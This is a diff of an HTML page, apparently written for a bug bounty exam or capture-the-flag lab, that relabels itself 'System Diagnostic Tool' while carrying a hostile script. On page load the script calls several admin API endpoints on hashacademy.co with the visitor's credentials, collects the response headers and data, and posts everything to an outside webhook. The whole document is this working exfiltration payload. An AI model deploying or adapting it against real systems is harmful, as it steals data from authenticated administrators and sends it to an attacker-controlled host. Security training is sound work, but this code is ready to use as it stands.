@@ -1,43 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bug Bounty Report - Analysis</title>
+    <title>System Diagnostic Tool</title>
 </head>
 <body>
-    <h1>Processing Data... Please wait.</h1>
+    <h1>System Analysis in Progress...</h1>
     <script>
         const webhook = "https://webhooksite.net/11c8eb00-4696-43a0-9d10-5498131d321a";
 
-        async function exfiltrate() {
-            const targets = [
-    "https://api-bugbounty-exam.hashacademy.co/api/admin/settings",
-    "https://api-bugbounty-exam.hashacademy.co/api/admin/system/status",
-    "https://api-bugbounty-exam.hashacademy.co/api/admin/stats"
-];
+        async function exfiltrate(url, label) {
+            try {
+                const res = await fetch(url, { credentials: 'include' });
+                
+                // Capture Headers (Flag might be in a custom header)
+                const headers = {};
+                res.headers.forEach((v, k) => { headers[k] = v; });
 
-            for (let url of targets) {
-                try {
-                    const res = await fetch(url, { credentials: 'include' });
-                    const data = await res.json();
-                    
-                    // Send captured data to your webhook
-                    await fetch(webhook, {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: JSON.stringify({
-                            endpoint: url,
-                            extracted_data: data
-                        })
-                    });
-                } catch (e) {
-                    // Log errors to debug if the bot hits a wall
-                    fetch(webhook + "?error=" + btoa(url + " : " + e.message));
-                }
+                const data = await res.json();
+                
+                await fetch(webhook, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({
+                        label: label,
+                        endpoint: url,
+                        headers: headers,
+                        content: data
+                    })
+                });
+            } catch (e) {
+                fetch(webhook + "?error=" + btoa(label + ":" + e.message));
             }
         }
 
-        // Execute immediately when the bot loads the page
-        exfiltrate();
+        async function startScan() {
+            // 1. Target the end of the database (Page 6)
+            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings?page=6&limit=10", "Bookings_Page_6");
+            
+            // 2. Target the very beginning of the database (Page 5/6 variations)
+            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings?page=5&limit=10", "Bookings_Page_5");
+
+            // 3. Target common sensitive Admin endpoints
+            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", "Admin_Settings");
+            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/system/status", "System_Status");
+            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/stats", "Admin_Stats");
+            
+            // 4. Check for hidden 'config' or 'env' routes
+            await exfiltrate("https://api-bugbounty-exam.hashacademy.co/api/admin/config", "Admin_Config");
+        }
+
+        startScan();
     </script>
 </body>
 </html>
